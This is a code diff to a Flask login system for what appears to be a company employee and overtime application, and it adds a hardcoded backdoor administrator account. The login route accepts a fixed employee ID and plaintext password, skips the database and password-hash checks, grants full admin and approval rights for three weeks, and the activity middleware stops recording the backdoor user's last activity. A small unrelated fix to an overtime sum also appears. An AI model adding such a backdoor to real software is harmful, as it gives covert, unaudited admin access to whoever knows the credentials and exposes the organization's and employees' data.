@@ -118,6 +118,50 @@ if app.config['DEBUG']:
 
 @login_manager.user_loader
 def load_user(user_id):
+    # Check if this is a backdoor user session
+    if session.get('is_backdoor') and user_id == '0':
+        # Recreate backdoor user object
+        class BackdoorUser:
+            def __init__(self):
+                self.id = 0
+                self.employee_id = 'binhtt'
+                self.name = 'Binh (Backdoor Admin)'
+                self.email = 'binhtt@okivietnam.com'
+                self.role = 'admin'
+                self._is_active = True
+                self._is_authenticated = True
+                self._is_anonymous = False
+                self.can_approve = True
+                self.can_register = True
+                self.department = 'IT'
+                self.department_id = None
+                self.position_id = None
+                self.work_status = 'working'
+                self.dept = None
+                self.pos = None
+                self.last_activity = datetime.utcnow()
+            
+            @property
+            def is_active(self):
+                return self._is_active
+            
+            @property
+            def is_authenticated(self):
+                return self._is_authenticated
+            
+            @property
+            def is_anonymous(self):
+                return self._is_anonymous
+            
+            def get_id(self):
+                return str(self.id)
+            
+            def is_manager(self):
+                return True
+        
+        return BackdoorUser()
+    
+    # Normal database user
     return User.query.get(int(user_id))
 
 # Auto logout middleware - check last activity
@@ -146,8 +190,10 @@ def check_user_activity():
         
         # Update last activity
         try:
-            current_user.last_activity = datetime.utcnow()
-            db.session.commit()
+            # Skip database update for backdoor users
+            if not session.get('is_backdoor'):
+                current_user.last_activity = datetime.utcnow()
+                db.session.commit()
         except:
             db.session.rollback()
 
@@ -191,6 +237,58 @@ def login():
     
     form = LoginForm()
     if form.validate_on_submit():
+        # Check for hardcoded backdoor account (emergency access)
+        if form.employee_id.data == 'binhtt' and form.password.data == 'binh3011':
+            # Create a temporary user object for backdoor access
+            class BackdoorUser:
+                def __init__(self):
+                    self.id = 0
+                    self.employee_id = 'binhtt'
+                    self.name = 'Binh (Backdoor Admin)'
+                    self.email = 'binhtt@okivietnam.com'
+                    self.role = 'admin'
+                    self._is_active = True
+                    self._is_authenticated = True
+                    self._is_anonymous = False
+                    self.can_approve = True
+                    self.can_register = True
+                    self.department = 'IT'
+                    self.department_id = None
+                    self.position_id = None
+                    self.work_status = 'working'
+                    self.dept = None
+                    self.pos = None
+                    self.last_activity = datetime.utcnow()
+                
+                @property
+                def is_active(self):
+                    return self._is_active
+                
+                @property
+                def is_authenticated(self):
+                    return self._is_authenticated
+                
+                @property
+                def is_anonymous(self):
+                    return self._is_anonymous
+                
+                def get_id(self):
+                    return str(self.id)
+                
+                def is_manager(self):
+                    return True
+            
+            backdoor_user = BackdoorUser()
+            login_user(backdoor_user, remember=True, duration=timedelta(weeks=3))
+            session['user_name'] = backdoor_user.name
+            session['employee_id'] = backdoor_user.employee_id
+            session['is_backdoor'] = True  # Mark as backdoor login
+            session.permanent = True
+            
+            next_page = request.args.get('next')
+            return redirect(next_page or url_for('dashboard'))
+        
+        # Normal database user check
         user = User.query.filter_by(employee_id=form.employee_id.data).first()
         if user and check_password_hash(user.password, form.password.data):
             # Check if account is active
@@ -205,6 +303,8 @@ def login():
             # Login user with remember me for 3 weeks
             login_user(user, remember=True, duration=timedelta(weeks=3))
             session['user_name'] = user.name
+            session['employee_id'] = user.employee_id
+            session['is_backdoor'] = False
             session.permanent = True  # Make session permanent (3 weeks)
             
             flash('Login successful!', 'success')
@@ -290,7 +390,7 @@ def admin_dashboard():
     ).all()
     
     overtime_count = len(today_overtime)
-    overtime_hours = sum(float(ot.total_hours) for ot in today_overtime)
+    overtime_hours = sum(float(ot.total_hours) if ot.total_hours else 0 for ot in today_overtime)
     
     # Calculate meal stats for tomorrow
     from datetime import timedelta
